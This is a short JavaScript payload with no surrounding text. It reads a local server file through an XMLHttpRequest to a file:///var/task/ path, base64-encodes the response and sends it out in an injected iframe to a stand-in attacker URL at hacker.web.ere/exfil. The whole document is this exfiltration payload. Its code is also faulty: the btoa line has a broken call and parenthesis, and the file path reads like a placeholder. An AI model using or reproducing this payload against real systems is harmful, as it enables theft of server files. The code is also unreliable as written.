function reqListener() {
var encoded =
encodeURI(this.responseText)
var b64 = btoa(this.responseText();
var raw = this.responseText;
document.write('<iframe src="https://www.hacker.web.ere/exfil?data='+b64+'"></iframe>');
}
var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", "file:///var/task/webhere_from_window_open_payload_here.html");
oReq.send();
